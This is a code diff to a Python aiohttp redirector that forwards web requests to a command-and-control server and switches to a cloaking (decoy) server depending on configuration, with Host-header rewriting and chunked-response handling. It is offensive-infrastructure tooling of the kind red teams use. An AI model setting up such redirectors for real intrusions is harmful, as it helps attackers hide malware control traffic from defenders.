@@ -1,17 +1,21 @@
-import aiohttp, argparse, logging, os, ssl, sys
+import aiohttp, argparse, logging, os, ssl, sys, traceback
 from aiohttp import web
 from datetime import datetime
 from urllib.parse import urlparse
 
 async def forwardRequest(request, useSsl=False):
     rawPath = request.path_qs
-    reqHeaders = request.headers
+    reqHeaders = await parseHeaders(request.headers)
     data = await request.read()
     requestingIP = request.remote
+    logging.debug('Redirecting Host: {}'.format(redirectHost))
     logging.debug('Redirecting Path: {}'.format(rawPath))
-    logging.debug('Redirecting Headers: {}'.format(reqHeaders))
-    logging.debug(reqHeaders['Host'])
     logging.debug('Remote host: {}'.format(requestingIP))
+
+    # Create the host values
+    destHost = '{}:{}'.format(redirectHost, redirectPort)
+    cloakHost = '{}:{}'.format(cloakingHost, cloakingPort)
+
     if useSsl == True:
         destURL = 'https://{}:{}{}'.format(redirectHost, redirectPort, rawPath)
         cloakURL = 'https://{}:{}{}'.format(cloakingHost, cloakingPort, rawPath)
@@ -24,25 +28,43 @@ async def forwardRequest(request, useSsl=False):
         cloakURL = 'http://{}:{}{}'.format(cloakingHost, cloakingPort, rawPath)
         sslcontext = None
     logging.debug('Forwarding request to remote system.')
+    reqHeaders['Host'] = destHost
     async with aiohttp.ClientSession(auto_decompress=False) as session:
         async with session.get(destURL, ssl=sslcontext, headers=reqHeaders, data=data) as response:
             body = await response.read()
             headers = response.headers
             status = response.status
-    if status == 200:
+    if status == 200 and not cloakingHost:
             return headers, status, body
-    else:
+    elif cloakingHost:
         logging.debug('C2 Server responded with with {} status, trying the cloaking server.'.format(status))
+        reqHeaders['Host'] = cloakHost
         async with aiohttp.ClientSession(auto_decompress=False) as cloakSession:
             async with cloakSession.get(cloakURL, ssl=sslcontext, headers=reqHeaders, data=data) as cloakResponse:
                 cloakBody = await cloakResponse.read()
                 cloakHeaders = cloakResponse.headers
                 cloakStatus = cloakResponse.status
                 return cloakHeaders, cloakStatus, cloakBody
+    else:
+        return headers, status, body
+
+async def parseHeaders(headers):
+    returnHeaders = {}
+    try:
+        for key, value in headers.items():
+            returnHeaders.update({key: value})
+    except Exception as e:
+        logging.error(e)
+    return returnHeaders
 
 async def handle_http(request):
     headers, status, body = await forwardRequest(request, useSsl=False)
-    return web.Response(headers=headers, status=status, body=body)
+    response = web.Response(headers=headers, status=status, body=body)
+
+    if "Transfer-Encoding" in headers.keys():
+        if headers['Transfer-Encoding'].lower() == "chunked":
+            response.enable_chunked_encoding()
+    return response
     
 async def handle_https(request):
     headers, status, body = await forwardRequest(request, useSsl=True)
